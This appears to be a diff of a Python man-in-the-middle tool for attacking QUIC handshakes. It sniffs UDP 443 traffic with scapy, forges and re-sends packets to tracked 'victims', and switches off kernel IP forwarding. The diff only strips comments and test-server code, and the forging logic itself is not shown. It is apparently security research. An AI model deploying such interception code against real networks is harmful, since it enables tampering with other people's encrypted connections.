@@ -19,7 +19,6 @@ from forge import forge_cc_scapy, forge_cc_2
 import threading, sys, os, multiprocessing
 from victims import Victims, IPv4Address
 from quic_protected import *
-from test_server.server import main
 from aioquic.quic.packet import QuicProtocolVersion
 
 
@@ -86,9 +85,7 @@ def handle_quic(pkt):
                 del new_pkt.getlayer(IP).chksum
                 del new_pkt.getlayer(UDP).chksum
                 send(new_pkt, iface=inner_iface, verbose=False)
-            #else:
-                #print("A packet of unknown LAN destination.")
-                # Need to fix change of victim sport with new connections of same src and dest ips.
+            
 
 
 
@@ -99,7 +96,6 @@ if __name__ == "__main__":
     """
         Global variables, constants and configurations settings.
     """
-    # Maybe turnning off ip_forward is not needed, but it let's a race between kernel to attacker_main2.py . (Need more testing.)
     os.system('sysctl -w net.ipv4.ip_forward=0')    # Set middlebox kernel ipv4 forwarding cancelled. So only user space forwarding.
     parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
     parser.add_argument(
@@ -128,7 +124,6 @@ if __name__ == "__main__":
     )
     args = parser.parse_args()
     
-    ##TODO: add changing of those while running 
     inner_iface = args.inner_iface
     try:
         attacker_inner_iface_ip = str(IPv4Address(args.inner_iface_ip))
@@ -143,14 +138,10 @@ if __name__ == "__main__":
         print(e)
         os.system('sysctl -w net.ipv4.ip_forward=1')
         os._exit(1)
-    vs = Victims()
-    #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
+    vs = Victims()      
     control_panel_thread = threading.Thread(target=vs.run)
     control_panel_thread.start()
     if isinstance(threading.current_thread(), threading._MainThread):
-        """p = multiprocessing.Process(target=main,
-            args=("0.0.0.0",4433, "./test/ssl_cert.pem", "./test/ssl_key.pem", "./test_server/index.html"), daemon=True)
-        p.start()"""
         if multiprocessing.parent_process() is None:
             # Sniff UDP 443 traffic and invoke handle_quic for each packet
             sniff(
@@ -158,10 +149,6 @@ if __name__ == "__main__":
                 prn=handle_quic,         # callback for every packet
                 store=False                  # don’t keep packets in memory
             )
-            """p.terminate()
-            if p.is_alive():       # very rare, but just in case on Unix:
-                os.kill(p.pid, signal.SIGKILL)  # Unix-only sledgehammer
-                p.join()"""
             control_panel_thread.join()
     os.system('sysctl -w net.ipv4.ip_forward=1')
 
